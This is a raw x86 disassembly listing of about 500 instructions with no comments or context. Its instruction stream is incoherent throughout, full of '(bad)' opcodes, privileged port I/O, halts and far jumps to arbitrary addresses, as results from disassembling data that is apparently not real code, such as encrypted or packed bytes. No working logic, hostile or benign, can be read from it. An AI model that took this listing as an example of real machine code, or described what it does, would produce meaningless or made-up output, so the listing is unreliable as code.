  407df8:	add    BYTE PTR ds:0xa42ad876,dl
  407dfe:	mov    ecx,0x3ee02318
  407e03:	(bad)  
  407e04:	cmp    dh,BYTE PTR [edx-0x5f]
  407e07:	mov    ebp,0x845d62f2
  407e0c:	xor    DWORD PTR [ecx-0x30],edx
  407e0f:	dec    esi
  407e10:	mov    eax,ds:0xa92482d3
  407e15:	xchg   ebx,eax
  407e16:	or     eax,0x31663b8b
  407e1b:	or     cl,0x1d
  407e1e:	imul   ecx,DWORD PTR [ebp+edi*8-0x45],0xffffff89
  407e23:	rol    ecx,0x2e
  407e26:	fadd   DWORD PTR [edx+0x60]
  407e29:	adc    DWORD PTR [ebp-0x47],esp
  407e2c:	xor    BYTE PTR [ecx],ch
  407e2e:	mov    WORD PTR [edi],?
  407e30:	and    eax,0xae5ca8ca
  407e35:	inc    ecx
  407e36:	imul   eax,DWORD PTR [ecx-0x66baf64f],0x50
  407e3d:	call   0x4ac45870
  407e42:	pusha  
  407e43:	and    BYTE PTR [ebp+0x9],ah
  407e46:	sti    
  407e47:	and    eax,0xcd8d6aec
  407e4c:	dec    ebx
  407e4d:	int3   
  407e4e:	mov    esp,0x484dee40
  407e53:	les    eax,FWORD PTR [esp+eax*4+0x40791d39]
  407e5a:	push   edi
  407e5b:	out    dx,al
  407e5c:	xchg   ebx,eax
  407e5d:	xor    BYTE PTR [edi-0x58167363],ah
  407e63:	pop    ss
  407e64:	push   0x22692525
  407e69:	sbb    ah,dh
  407e6b:	mov    ebx,0x3a1dbb74
  407e70:	in     eax,dx
  407e71:	push   cs
  407e72:	(bad)  [esi-0x69]
  407e75:	(bad)  
  407e76:	pusha  
  407e77:	dec    eax
  407e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e79:	(bad)  [ecx-0x7d]
  407e7c:	mov    bh,0x92
  407e7e:	adc    al,0xa5
  407e80:	pop    esp
  407e81:	mov    eax,0xab0f6633
  407e86:	and    BYTE PTR [edx],0x96
  407e89:	cwde   
  407e8a:	cmp    eax,0xa6fd7b34
  407e8f:	fbld   TBYTE PTR [ecx-0xc19f5d8]
  407e95:	cmp    DWORD PTR [ecx-0x6e],ecx
  407e98:	jo     0x407e7f
  407e9a:	retf   0x8615
  407e9d:	ret    
  407e9e:	loope  0x407ea3
  407ea0:	fwait
  407ea1:	fwait
  407ea2:	fwait
  407ea3:	dec    DWORD PTR [ebx]
  407ea5:	lock imul esi,edi,0xffffffa7
  407ea9:	and    DWORD PTR [ecx+eax*1-0x253a2120],ebp
  407eb0:	inc    edi
  407eb1:	inc    edx
  407eb2:	ror    BYTE PTR [edi+0x10],cl
  407eb5:	test   eax,0xe295214
  407eba:	mov    DWORD PTR [edi-0x29d273e4],0xc675e3ca
  407ec4:	ret    0x30ba
  407ec7:	pop    esp
  407ec8:	inc    ebp
  407ec9:	fucomip st,st(7)
  407ecb:	fcmovne st,st(5)
  407ecd:	push   edx
  407ece:	mov    edi,0xde4ac091
  407ed3:	push   es
  407ed4:	pop    ebx
  407ed5:	mov    BYTE PTR [ebx+0x71],bh
  407ed8:	lea    ebx,[ebx]
  407eda:	je     0x407f40
  407edc:	fdivr  QWORD PTR [ecx]
  407ede:	xchg   esp,eax
  407edf:	add    al,0x95
  407ee1:	clc    
  407ee2:	dec    edi
  407ee3:	adc    eax,DWORD PTR [eax]
  407ee5:	ins    BYTE PTR es:[edi],dx
  407ee6:	std    
  407ee7:	jnp    0x407ee9
  407ee9:	test   DWORD PTR [eax+0x3a3d60b9],edx
  407eef:	cwde   
  407ef0:	call   0x9b823f08
  407ef5:	add    eax,0x30a00408
  407efa:	mov    dh,0xe
  407efc:	push   es
  407efd:	inc    ecx
  407efe:	mov    ecx,0x498a9943
  407f03:	inc    esp
  407f04:	sub    al,0xc3
  407f06:	clc    
  407f07:	repz mov eax,0x14630aed
  407f0d:	mov    ecx,0x397936e
  407f12:	or     bh,BYTE PTR [edi-0x519ed741]
  407f18:	or     eax,0x535894c6
  407f1d:	nop
  407f1e:	in     al,0x13
  407f20:	xchg   edx,eax
  407f21:	fdiv   QWORD PTR [ecx+0x3ec1ee87]
  407f27:	ins    DWORD PTR es:[edi],dx
  407f28:	mov    ecx,0xda73348f
  407f2d:	jmp    0xca5a:0x2deb5e80
  407f34:	mov    al,ds:0x6bd065a4
  407f39:	shr    ebx,cl
  407f3b:	ja     0x407f26
  407f3d:	mov    ah,0x3b
  407f3f:	hlt    
  407f40:	jp     0x407f9f
  407f42:	push   es
  407f43:	and    DWORD PTR [ecx],0xffffff9d
  407f46:	outs   dx,BYTE PTR ds:[esi]
  407f47:	xchg   edi,eax
  407f48:	dec    esi
  407f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f4a:	dec    ebx
  407f4b:	mov    ebx,0x4a946dd
  407f50:	test   eax,0xa790fa4
  407f55:	call   0xdf54:0x1e88d058
  407f5c:	arpl   WORD PTR [eax],si
  407f5e:	leave  
  407f5f:	repz mov esp,0xe18c6b2a
  407f65:	fidiv  DWORD PTR [ebp-0x5cb97395]
  407f6b:	mov    edi,0xcf73dcf8
  407f70:	jne    0x407fb0
  407f72:	div    BYTE PTR [ecx-0x38e82271]
  407f78:	loopne 0x407f94
  407f7a:	add    dh,ch
  407f7c:	inc    ecx
  407f7d:	(bad)  
  407f7e:	jecxz  0x407fff
  407f80:	cld    
  407f81:	(bad)
  407f85:	mov    ebp,0xf4a702
  407f8a:	push   esp
  407f8b:	jbe    0x407f29
  407f8d:	in     eax,0xd6
  407f8f:	in     eax,dx
  407f90:	cmp    eax,0x1f5da70e
  407f95:	push   ebx
  407f96:	paddw  mm3,QWORD PTR [esi-0x33]
  407f9a:	add    DWORD PTR [eax],edx
  407f9c:	and    eax,0xf9bdc4ee
  407fa1:	jge    0x407f47
  407fa3:	out    dx,al
  407fa4:	(bad)  
  407fa5:	cli    
  407fa6:	imul   eax,edi,0xffffffe6
  407fa9:	sar    DWORD PTR ds:0x939181d,0x1b
  407fb0:	test   DWORD PTR [ebx+ebp*8-0x17494b77],0x961792d2
  407fbb:	cmp    al,0x77
  407fbd:	dec    edx
  407fbe:	arpl   sp,si
  407fc0:	ret    0x21ad
  407fc3:	jno    0x40802b
  407fc5:	inc    eax
  407fc6:	repz jbe 0x407fb3
  407fc9:	mov    al,BYTE PTR [bx+si+0x6fc0]
  407fce:	lods   al,BYTE PTR ds:[esi]
  407fcf:	rol    cl,0x2e
  407fd2:	mov    dh,0x99
  407fd4:	js     0x408031
  407fd6:	or     al,0xc
  407fd8:	jle    0x407f95
  407fda:	mov    es,WORD PTR [eax]
  407fdc:	sub    DWORD PTR [esi],eax
  407fde:	pop    es
  407fdf:	jecxz  0x407f7e
  407fe1:	nop
  407fe2:	aad    0xef
  407fe4:	cwde   
  407fe5:	pop    ecx
  407fe6:	call   0x11016fb0
  407feb:	ret    0xeef1
  407fee:	mov    ebx,0xa5169b44
  407ff3:	outs   dx,BYTE PTR ds:[esi]
  407ff4:	xchg   ecx,eax
  407ff5:	xchg   edi,eax
  407ff6:	jge    0x40804f
  407ff8:	(bad)  
  407ff9:	sti    
  407ffa:	and    BYTE PTR [esi],ah
  407ffc:	(bad)  
  407ffd:	pusha  
  407ffe:	mov    WORD PTR [esi],es
  408000:	xchg   ebx,eax
  408001:	xchg   ebx,eax
  408002:	mov    BYTE PTR [ecx],ch
  408004:	dec    edx
  408005:	iret   
  408006:	push   ecx
  408007:	cmp    ah,BYTE PTR [ebx]
  408009:	fnstsw WORD PTR [ebx]
  40800b:	inc    esp
  40800c:	in     al,dx
  40800d:	cmp    ah,BYTE PTR [eax-0x5896b3b0]
  408013:	pop    es
  408014:	and    al,0x52
  408016:	xchg   ebx,eax
  408017:	dec    eax
  408018:	ret    
  408019:	inc    esi
  40801a:	dec    edi
  40801b:	xor    eax,ebp
  40801d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40801e:	hlt    
  40801f:	mov    edx,0xebdfa2d
  408024:	in     eax,dx
  408025:	jbe    0x407fb2
  408027:	inc    esp
  408028:	and    eax,0xda424924
  40802d:	push   0xffffff91
  40802f:	and    al,0x2d
  408031:	rcl    BYTE PTR [esi-0x65],cl
  408034:	shl    DWORD PTR [eax-0x50],0x70
  408038:	sub    BYTE PTR [ebx+0x5a608500],dh
  40803e:	sbb    al,0x1e
  408040:	push   ds
  408041:	mov    ds:0x50254bb5,al
  408046:	dec    edx
  408047:	xor    DWORD PTR [esi],ebx
  408049:	(bad)  
  40804a:	cdq    
  40804b:	dec    esp
  40804c:	es (bad) 
  40804f:	push   es
  408050:	add    DWORD PTR [edi-0x20523c90],0xffffffb1
  408057:	lods   al,BYTE PTR ds:[esi]
  408058:	add    eax,esp
  40805a:	push   ds
  40805b:	and    al,0x4d
  40805d:	shr    DWORD PTR [ebp+0x9],cl
  408060:	out    dx,eax
  408061:	xor    edx,esi
  408063:	add    BYTE PTR cs:[eax],al
  408066:	stos   BYTE PTR es:[edi],al
  408067:	mov    eax,ds:0xddaed7b6
  40806c:	bound  edx,QWORD PTR [esi-0x344caf93]
  408072:	jecxz  0x4080e4
  408074:	fcmovnu st,st(3)
  408076:	jb     0x408078
  408078:	inc    esi
  408079:	out    0x40,al
  40807b:	ror    DWORD PTR [eax+esi*4],cl
  40807e:	jle    0x40801f
  408080:	cmp    BYTE PTR [esi-0x31],cl
  408083:	mov    esi,0x2803c14a
  408088:	ror    DWORD PTR [eax-0x6c9577ea],1
  40808e:	add    eax,0xcc33d61f
  408093:	xor    ecx,ecx
  408095:	cmp    al,0xb3
  408097:	int3   
  408098:	xor    ecx,DWORD PTR [ebx+0x5e]
  40809b:	or     BYTE PTR [edx+0x53],cl
  40809e:	push   edi
  40809f:	hlt    
  4080a0:	fmul   DWORD PTR [eax+ebx*2]
  4080a3:	in     eax,0x7f
  4080a5:	ins    BYTE PTR es:[edi],dx
  4080a6:	ret    0x7c52
  4080a9:	lods   al,BYTE PTR ds:[esi]
  4080aa:	mov    DWORD PTR [edx],ecx
  4080ac:	fdivr  DWORD PTR [eax+0x6ae857ac]
  4080b2:	jnp    0x4080c7
  4080b4:	cmp    BYTE PTR [edx],bl
  4080b6:	mov    edi,0x303db44d
  4080bb:	or     eax,0x8af85383
  4080c0:	popa   
  4080c1:	inc    esp
  4080c2:	inc    eax
  4080c3:	adc    DWORD PTR [ebx],eax
  4080c5:	dec    ecx
  4080c6:	push   eax
  4080c7:	jl     0x408134
  4080c9:	push   ss
  4080ca:	mov    WORD PTR [ebx+0x246312d4],fs
  4080d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d1:	dec    ebp
  4080d2:	sub    ebx,ecx
  4080d4:	inc    dl
  4080d6:	dec    edi
  4080d7:	popa   
  4080d8:	push   ss
  4080d9:	dec    esp
  4080da:	and    eax,0x9750e12f
  4080df:	push   0x8d4b625d
  4080e4:	fstp   QWORD PTR [edi-0x4ef089df]
  4080ea:	in     eax,0x1c
  4080ec:	imul   ecx,DWORD PTR [esi],0xa47dcae9
  4080f2:	cdq    
  4080f3:	mov    eax,ds:0x209848c8
  4080f8:	in     eax,dx
  4080f9:	test   BYTE PTR [esi+0x4b],cl
  4080fc:	icebp  
  4080fd:	mov    bh,0xff
  4080ff:	neg    bh
  408101:	inc    edx
  408102:	test   eax,0x1fef52ee
  408107:	cld    
  408108:	add    al,0xb7
  40810a:	outs   dx,BYTE PTR ds:[esi]
  40810b:	frstor [edx]
  40810d:	iret   
  40810e:	jae    0x408162
  408110:	aas    
  408111:	ret    
  408112:	push   esp
  408113:	pop    ecx
  408114:	xchg   esi,eax
  408115:	in     al,dx
  408116:	out    dx,al
  408117:	out    dx,al
  408118:	mov    dh,0x37
  40811a:	ss ss push ds
  40811d:	arpl   WORD PTR ds:0x79503f00,cx
  408123:	dec    eax
  408124:	dec    eax
  408125:	fst    DWORD PTR [ecx-0x2a]
  408128:	(bad)  
  408129:	aad    0xcd
  40812b:	xchg   DWORD PTR [eax],eax
  40812d:	scas   eax,DWORD PTR es:[edi]
  40812e:	pop    esi
  40812f:	(bad)  [ebx]
  408131:	iret   
  408132:	dec    edi
  408133:	lock into 
  408135:	ins    BYTE PTR es:[edi],dx
  408136:	hlt    
  408137:	add    BYTE PTR [esi],dl
  408139:	push   es
  40813a:	test   BYTE PTR [edx+0x28],ch
  40813d:	in     al,0x3b
  40813f:	xchg   esp,eax
  408140:	pop    edx
  408141:	scas   al,BYTE PTR es:[edi]
  408142:	shl    DWORD PTR [ecx-0x68],0x87
  408146:	jne    0x408112
  408148:	fs sub al,0x46
  40814b:	or     ecx,DWORD PTR [edx+0x20cf32c2]
  408151:	retf   
  408152:	pop    ebp
  408153:	mov    ds:0x283b340f,eax
  408158:	loopne 0x408137
  40815a:	or     BYTE PTR [esi],0xa2
  40815d:	icebp  
  40815e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40815f:	jb     0x408198
  408161:	pop    eax
  408162:	lahf   
  408163:	out    dx,eax
  408164:	sbb    BYTE PTR [ecx-0x70a41de1],bh
  40816a:	lea    esp,[ebx+0x2e220c55]
  408170:	sbb    eax,DWORD PTR [ebx+0x23e5541]
  408176:	xchg   eax,ebx
  408178:	in     al,dx
  408179:	mov    al,0xd4
  40817b:	pop    ecx
  40817c:	inc    esp
  40817d:	pusha  
  40817e:	or     al,0xc1
  408180:	push   edi
  408181:	shl    DWORD PTR [esi+ebx*2-0x3a],1
  408185:	mov    WORD PTR [edx-0x590fc8ce],fs
  40818b:	xchg   ecx,eax
  40818c:	dec    ecx
  40818d:	cld    
  40818e:	pop    es
  40818f:	repnz mov dl,0x4f
  408192:	pop    esi
  408193:	sahf   
  408194:	mov    al,ds:0xb01590d0
  408199:	cmp    esi,DWORD PTR [edi]
  40819b:	int3   
  40819c:	out    0x25,eax
  40819e:	mov    bl,0xac
  4081a0:	and    BYTE PTR [edi+0x5e25384f],bl
  4081a6:	loopne 0x4081cf
  4081a8:	aaa    
  4081a9:	scas   eax,DWORD PTR es:[edi]
  4081aa:	xchg   edx,eax
  4081ab:	and    al,0x49
  4081ad:	xchg   ebp,eax
  4081ae:	and    bl,BYTE PTR ds:0xdb61fef7
  4081b4:	ins    BYTE PTR es:[edi],dx
  4081b5:	ss pop ebx
  4081b7:	retf   0xc83b
  4081ba:	mov    dl,0xcc
  4081bc:	pop    eax
  4081bd:	imul   ebp,edi,0x5b
  4081c0:	pop    esi
  4081c1:	rcr    BYTE PTR [edx],0x0
  4081c4:	out    dx,al
  4081c5:	inc    ecx
  4081c6:	je     0x408221
  4081c8:	mov    esi,0x895ab547
  4081cd:	push   esp
  4081ce:	retf   0x9185
  4081d1:	lods   al,BYTE PTR ds:[esi]
  4081d2:	fwait
  4081d3:	jl     0x408218
  4081d5:	dec    edx
  4081d6:	dec    ecx
  4081d7:	sahf   
  4081d8:	iret   
  4081d9:	mov    ecx,0x5cca6376
  4081de:	mov    bh,0x8f
  4081e0:	ja     0x4081b4
  4081e2:	pop    eax
  4081e3:	shr    DWORD PTR [ebp+0x40c98778],0x31
  4081ea:	ror    DWORD PTR [eax+0x577bf47b],cl
  4081f0:	hlt    
  4081f1:	sbb    bh,al
  4081f3:	inc    esp
  4081f4:	neg    DWORD PTR [eax+0x39]
  4081f7:	in     eax,dx
  4081f8:	mov    ah,0x8b
  4081fa:	fbld   TBYTE PTR [edi+0x5]
  4081fd:	int3   
  4081fe:	jae    0x4081c8
  408200:	jae    0x408271
  408202:	sbb    DWORD PTR [ebx],0x6f
  408205:	iret   
  408206:	stos   DWORD PTR es:[edi],eax
  408207:	lds    ebp,FWORD PTR [ecx-0x12]
  40820a:	sub    BYTE PTR [ebx],ch
  40820c:	div    BYTE PTR [edi]
  40820e:	sbb    eax,0xd222cd88
  408213:	pop    ds
  408214:	mov    bh,0x8a
  408216:	inc    ecx
  408217:	sbb    al,0xc9
  408219:	sub    bl,BYTE PTR [edx]
  40821b:	sti    
  40821c:	xchg   esi,eax
  40821d:	fadd   DWORD PTR [ebx]
  40821f:	or     esp,DWORD PTR [eax-0x78]
  408222:	cdq    
  408223:	inc    esp
  408224:	int3   
  408225:	and    BYTE PTR [edx],al
  408227:	imul   ebp,DWORD PTR [eax+0x186220c0],0x1
  40822e:	sbb    al,0x82
  408230:	pop    ecx
  408231:	push   edx
  408232:	cdq    
  408233:	sbb    ch,ah
  408235:	and    al,BYTE PTR [edx+0x11]
  408238:	add    al,ah
  40823a:	xor    BYTE PTR [ebx-0x1ce90cb4],dl
  408240:	jns    0x4081cd
  408242:	mov    ebp,0xd89e9f71
  408247:	out    0x91,al
  408249:	xchg   DWORD PTR [ebx-0x2e],edx
  40824c:	xor    al,0xa5
  40824e:	sub    al,0xb5
  408250:	scas   eax,DWORD PTR es:[edi]
  408251:	cmp    DWORD PTR [edx+0x44],0xffffffa1
  408255:	hlt    
  408256:	jmp    0x4082a3
  408258:	xor    al,0x23
  40825a:	or     DWORD PTR [ebp+0x59],esp
  40825d:	push   ss
  40825e:	pop    edx
  40825f:	jmp    0x40823c
  408261:	ja     0x40820c
  408263:	in     eax,0x7b
  408265:	xchg   esi,eax
  408266:	xor    eax,0x2883dc00
  40826b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40826c:	fiadd  WORD PTR [edi+0x200735b5]
  408272:	mov    eax,0x6f374041
  408277:	in     al,dx
  408278:	jno    0x408265
  40827a:	sbb    BYTE PTR ss:[ebx+0x3c02111e],dl
  408281:	call   0xb595:0x565ddf62
  408288:	mov    esp,0xaa2e4e3
  40828d:	sbb    al,0x7c
  40828f:	stos   DWORD PTR es:[edi],eax
  408290:	mov    edi,0x8c58f823
  408295:	adc    eax,0x265b31be
  40829a:	push   ebx
  40829b:	ret    
  40829c:	sub    bl,BYTE PTR fs:[eax-0x41a6fa34]
  4082a3:	call   0x70e415b1
  4082a8:	ins    BYTE PTR es:[edi],dx
  4082a9:	aad    0xed
  4082ab:	(bad)  
  4082ad:	jbe    0x40824a
  4082af:	mov    ebx,0xa2f8a444
  4082b4:	push   ecx
  4082b5:	loopne 0x408325
  4082b7:	clc    
  4082b8:	push   esi
  4082b9:	push   ebp
  4082ba:	jns    0x4082c8
  4082bc:	push   ds
  4082bd:	jbe    0x408284
  4082bf:	ja     0x408340
  4082c1:	out    dx,eax
  4082c2:	loope  0x40825c
  4082c4:	cmp    BYTE PTR es:[edx+esi*2-0x4bbc7eb],al
  4082cc:	lea    esp,[edi+0x1]
  4082cf:	and    DWORD PTR [edx+0x62],ebx
  4082d2:	lods   al,BYTE PTR ds:[esi]
  4082d3:	push   ebx
  4082d4:	cld    
  4082d5:	ret    0xc083
  4082d8:	cmp    al,0x87
  4082da:	ret    
  4082db:	sbb    DWORD PTR [edi+eiz*2+0x368052d0],ecx
  4082e2:	or     al,0xed
  4082e4:	pushf  
  4082e5:	lea    eax,[ecx+0xf]
  4082e8:	sub    DWORD PTR [esi+edx*8],esp
  4082eb:	xchg   esi,eax
  4082ec:	sub    esi,ebx
  4082ee:	pop    es
  4082ef:	repnz cmp al,0x67
  4082f2:	jg     0x408373
  4082f4:	mov    edi,0x4a520006
  4082f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082fa:	shr    DWORD PTR [ecx-0x41082103],cl
  408300:	mov    bh,0x66
  408302:	add    BYTE PTR [edi],bh
  408304:	dec    eax
  408305:	dec    ecx
  408306:	xchg   edx,eax
  408307:	in     al,0xa4
  408309:	rcr    edx,1
  40830b:	lea    eax,[ecx]
  40830d:	mov    BYTE PTR [esi+0x1],al
  408310:	sub    ch,BYTE PTR [ecx]
  408312:	cmp    DWORD PTR [eax],edi
  408314:	fsub   DWORD PTR [edi-0x1]
  408317:	inc    eax
  408318:	xor    ch,0xc3
  40831b:	and    BYTE PTR [ebx+0x7b],0xff
  40831f:	pop    esi
  408320:	jns    0x408393
  408322:	fsub   QWORD PTR [edx]
  408324:	imul   eax,edi,0xffffffbd
  408327:	popf   
  408328:	fidivr WORD PTR [eax+eax*4]
  40832b:	xor    ecx,0x1a
  40832e:	sbb    DWORD PTR [ebx],edi
  408330:	sbb    eax,0x2cb4aa6b
  408335:	mov    eax,ds:0xb18e3755
  40833a:	push   ss
  40833b:	mov    WORD PTR [esi+0x32cc0514],?
  408341:	cwde   
  408342:	into   
  408343:	sub    eax,0x163b9b3
  408348:	test   DWORD PTR [esi+0x61c9a796],eax
  40834e:	cmp    al,BYTE PTR [ebx-0x30e4c606]
  408354:	fcmovu st,st(4)
  408356:	(bad)  
  408357:	xchg   esp,eax
  408358:	jecxz  0x408314
  40835a:	xor    bl,BYTE PTR [edx+0x10011e87]
  408360:	dec    ebp
  408361:	repz and edi,DWORD PTR [esi]
  408364:	push   edi
  408365:	add    BYTE PTR [ecx-0x4f9d9a1a],al
  40836b:	mov    ch,cl
  40836d:	mov    bh,BYTE PTR [eax+0x7f]
  408370:	xor    BYTE PTR ds:0xf5a10662,ah
  408376:	and    bh,cl
  408378:	imul   edx,esi,0x2912d172
  40837e:	fdivr  QWORD PTR [esi+0x75f4d73c]
  408384:	xchg   BYTE PTR [edx-0x63],dl
  408387:	push   0x10
  408389:	push   esp
  40838a:	dec    esp
  40838b:	std    
  40838c:	inc    ebx
  40838d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838e:	imul   ebx,DWORD PTR [ecx-0x6a],0x2fefefec
  408395:	and    eax,0xf7ad6914
  40839a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40839b:	shr    ecx,cl
  40839d:	mov    ch,0xbb
  40839f:	aam    0xd2
  4083a1:	cmp    eax,0xee001acb
  4083a6:	inc    ecx
  4083a7:	lods   al,BYTE PTR ds:[esi]
  4083a8:	mov    ch,0x43
  4083aa:	and    dh,0x52
  4083ad:	pusha  
  4083ae:	inc    edx
  4083af:	dec    edx
  4083b0:	mov    BYTE PTR [edi+0x130e0e13],0x17
  4083b7:	sbb    bh,BYTE PTR [ebx]
  4083b9:	lea    ecx,ss:[edi-0x41388763]
  4083c0:	sub    edi,DWORD PTR [edi-0x54]
  4083c3:	xor    WORD PTR [edi],ax
  4083c6:	sar    DWORD PTR [ebp+0x7575131c],0x95
  4083cd:	(bad)  
  4083ce:	fcomp  QWORD PTR [ecx-0x26a4c7b7]
  4083d4:	push   edx
  4083d5:	xchg   esp,eax
  4083d6:	or     dh,BYTE PTR cs:[eax]
  4083d9:	iret   
  4083da:	pusha  
  4083db:	sahf   
  4083dc:	cmp    eax,DWORD PTR [edi+0x60]
  4083df:	mov    BYTE PTR [eax],cl
  4083e1:	sbb    BYTE PTR [ebx],cl
  4083e3:	mov    dl,0x79
  4083e5:	call   0x9a7f:0x5de02a6
  4083ec:	mov    bh,0xf8
  4083ee:	mov    dh,0xc4
  4083f0:	pop    ds
  4083f1:	pop    edi
  4083f2:	xchg   esi,eax
  4083f3:	and    eax,0x90a468c6
  4083f8:	push   esp
  4083f9:	sub    edi,DWORD PTR [eax]
  4083fb:	xor    eax,0xc808ddaf
  408400:	les    ebx,FWORD PTR [eax+0x2c]
  408403:	sbb    eax,eax
  408405:	mov    al,0x84
  408407:	shl    DWORD PTR [ebp+0x6076758d],1
  40840d:	xchg   esp,eax
  40840e:	arpl   WORD PTR [esi+0x4a],ax
  408411:	mov    ebx,0xe42516f3
  408416:	push   es
  408417:	pop    edx
  408418:	cmp    DWORD PTR [edx+edx*4+0x182a7e92],esi
  40841f:	push   cs
  408420:	aaa    
  408421:	xor    DWORD PTR [edx+0x3f1b25c],edi
  408427:	and    BYTE PTR [eax-0x53],ch
  40842a:	xchg   edi,eax
  40842b:	idiv   cl
  40842d:	out    dx,eax
  40842e:	push   edi
  40842f:	test   BYTE PTR [eax],dl
  408431:	imul   eax,DWORD PTR [esi],0xfffffff0
  408434:	adc    DWORD PTR [ecx+eiz*1],0xffffffe5
  408438:	mov    dh,0xd1
  40843a:	sbb    bl,BYTE PTR [ecx]
  40843c:	add    eax,DWORD PTR [eax-0x6794a7f0]
  408442:	dec    esi
  408443:	out    0x1c,al
  408445:	into   
  408446:	jp     0x408450
  408448:	popa   
  408449:	sbb    eax,0x94b66c8d
  40844e:	call   0x2d51:0xdce81d7d
  408455:	cld    
  408456:	push   cs
  408457:	lods   eax,DWORD PTR ds:[esi]
  408458:	jg     0x40847f
  40845a:	sub    edi,DWORD PTR [eax]
  40845c:	jmp    0x3dc6:0x874ca3f8
  408463:	aad    0x1e
  408465:	xor    dh,al
  408467:	loopne 0x408423
  408469:	push   ss
  40846a:	pop    ebx
  40846b:	imul   edx,DWORD PTR [ecx],0xffffffd6
  40846e:	mov    ds:0xcb6b408d,al
  408473:	cmp    al,0xb7
  408475:	mov    es,WORD PTR [ecx]
  408477:	int3   
  408478:	sbb    al,0x10
  40847a:	adc    al,0xe5
  40847c:	ret    0x500c
  40847f:	repnz or BYTE PTR [ebx],dh
  408482:	loopne 0x4084bc
  408484:	push   edx
  408485:	stos   DWORD PTR es:[edi],eax
  408486:	ret    
  408487:	and    ecx,DWORD PTR [eax+0x64d511cf]
  40848d:	lea    esp,[ecx+0x6f]
  408490:	out    dx,eax
  408491:	es xchg edi,eax
  408493:	cs mov esp,0x5f37f9ce
  408499:	and    ecx,edi
  40849b:	xor    edx,DWORD PTR [edx+edx*2+0x3c9b870c]
  4084a2:	idiv   al
  4084a4:	xchg   ebx,eax
  4084a5:	pushf  
  4084a6:	cmp    al,0xfd
  4084a8:	add    ch,bh
  4084aa:	rol    DWORD PTR [esi-0x13],0x52
  4084ae:	icebp  
  4084af:	xor    eax,0xaed6a402
  4084b4:	fnstsw WORD PTR [eax+0x8be559f]
  4084ba:	lock push es
  4084bc:	pop    ecx
  4084bd:	enter  0xf073,0xaf
  4084c1:	dec    edx
  4084c2:	clc    
  4084c3:	pop    esi
  4084c4:	mov    edi,0x9ffa3895
  4084c9:	sub    BYTE PTR [eax-0x55],ch
  4084cc:	sbb    BYTE PTR [esi+0x6a],0x19
  4084d0:	or     al,0x6
  4084d2:	xchg   esp,eax
  4084d3:	arpl   WORD PTR ds:[eax-0x2b],si
  4084d7:	cld    
  4084d8:	push   es
  4084d9:	jns    0x40848f
  4084db:	mov    edx,0x781dbc54
  4084e0:	jmp    0x408501
  4084e2:	inc    bl
  4084e4:	jg     0x40853e
  4084e6:	lods   al,BYTE PTR ds:[esi]
  4084e7:	mov    eax,0x6b25b785
  4084ec:	add    BYTE PTR [eax+0x73ee7c8b],bh
  4084f2:	lahf   
  4084f3:	xchg   ebx,eax
  4084f4:	dec    edx
  4084f5:	retf   0x2513
  4084f8:	ds pop es
  4084fa:	and    BYTE PTR [eax+ebp*1-0x21238d64],bh
  408501:	popf   
  408502:	xor    bl,BYTE PTR [edi-0x22b1af47]
  408508:	(bad)  
  408509:	aas    
  40850a:	mov    ss,WORD PTR [esi]
  40850c:	xor    al,0x4c
  40850e:	xchg   DWORD PTR [eax-0x1825b87c],esp
  408514:	add    DWORD PTR [edx+eax*1+0x28],edx
  408518:	js     0x408540
  40851a:	ror    DWORD PTR [esp+ebx*1+0x55f9d12c],1
  408521:	(bad)  
  408522:	(bad)  
  408524:	(bad)  
  408525:	cmp    BYTE PTR [ecx+ebx*2+0x6d],bh
  408529:	aaa    
  40852a:	sbb    BYTE PTR [ebx+0x6ccb0a28],ch
  408530:	outs   dx,BYTE PTR ds:[esi]
  408531:	cdq    
  408532:	into   
  408533:	sub    al,0x87
  408535:	xor    ecx,ebx
  408537:	je     0x408567
  408539:	enter  0x2832,0x3b
  40853d:	or     ecx,DWORD PTR [edi+0x79]
  408540:	lea    esp,[ecx-0x5]
  408543:	push   ebx
  408544:	or     dh,BYTE PTR [ecx-0x15c64e50]
  40854a:	xchg   ecx,eax
  40854b:	out    dx,al
  40854c:	push   edx
  40854d:	cmp    eax,0xfc39c470
  408552:	mov    dh,0xd9
  408554:	je     0x408518
  408556:	sbb    ebp,DWORD PTR [edi+0x5bbd877e]
  40855c:	pop    ss
  40855d:	push   eax
  40855e:	shl    al,cl
  408560:	shr    cl,0xa1
  408563:	mov    bh,0xd6
  408565:	fdiv   QWORD PTR [ebx+0x45eb795c]
  40856b:	pop    esi
  40856c:	jns    0x408557
  40856e:	pop    ebx
  40856f:	ins    BYTE PTR es:[edi],dx
  408570:	in     eax,dx
  408571:	pushf  
  408572:	in     eax,0xa9
  408574:	lahf   
  408575:	clc    
  408576:	or     BYTE PTR [ebx+0x4abb90c1],al
  40857c:	test   al,0x86
  40857e:	(bad)  
  40857f:	jne    0x40851c
  408581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408582:	inc    esi
  408583:	and    eax,0xc17d516a
  408588:	sub    al,0x50
  40858a:	ror    BYTE PTR ds:0x3033f2a6,cl
  408590:	mov    al,ds:0x5f2e944
  408595:	xchg   edx,eax
  408596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408597:	pop    edx
  408598:	xor    al,0x46
  40859a:	mov    ebx,0xa76b20f5
  40859f:	call   0x2441:0x8b5a74e
  4085a6:	scas   eax,DWORD PTR es:[edi]
  4085a7:	(bad)  
  4085a9:	(bad)  
  4085aa:	out    dx,eax
  4085ab:	pop    ebp
  4085ac:	(bad)  
  4085ad:	add    BYTE PTR [eax+0x17],dh
  4085b0:	xor    esi,eax
  4085b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085b3:	mov    edx,0x10a5372c
  4085b8:	cmc    
  4085b9:	ja     0x4085e9
  4085bb:	add    al,0x58
  4085bd:	int    0xed
  4085bf:	mov    ebp,0xd7b8ac8c
  4085c4:	adc    al,0xe0
  4085c6:	inc    esi
  4085c7:	(bad)  
  4085c9:	dec    edi
  4085ca:	stc    
